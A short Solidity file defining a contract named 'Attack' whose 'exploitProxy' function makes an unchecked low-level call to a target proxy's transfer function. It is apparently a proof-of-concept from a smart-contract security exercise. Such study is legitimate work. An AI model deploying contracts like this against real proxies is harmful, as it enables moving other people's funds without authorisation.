// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.13;

contract Attack {
     address public safuProxy;

    constructor(address _proxy) {
        safuProxy = _proxy;
    }
    // address public safuProxy;
    function exploitProxy(address sender, address receiver, uint256 _amount) public {
        safuProxy.call(abi.encodeWithSignature("transfer(address,uint256)", receiver, _amount));
  }
}